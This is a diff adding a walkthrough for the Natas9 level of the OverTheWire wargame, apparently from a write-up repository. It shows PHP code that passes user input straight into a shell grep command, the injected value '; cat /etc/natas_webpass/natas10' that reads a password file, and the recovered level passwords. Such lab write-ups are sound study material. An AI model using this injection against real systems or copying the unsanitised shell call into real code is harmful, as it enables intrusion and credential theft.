@@ -287,4 +287,33 @@ The output of running for this is `oubWYf2kBq`. Input this in the `Input secret`
 Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl 
 ```
 
+## Natas9
+
+> Username: natas8
+> 
+> Password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+> 
+> URL http://natas9.natas.labs.overthewire.org/
+
+In this level we get the following php code
+```php
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+```
+
+With this then there is command injection in the input field so if we input `; cat /etc/natas_webpass/natas10` in the search field then we get the password since the ` ; ` separates commands in a shell.
+
+The password is:
+```
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+```
 
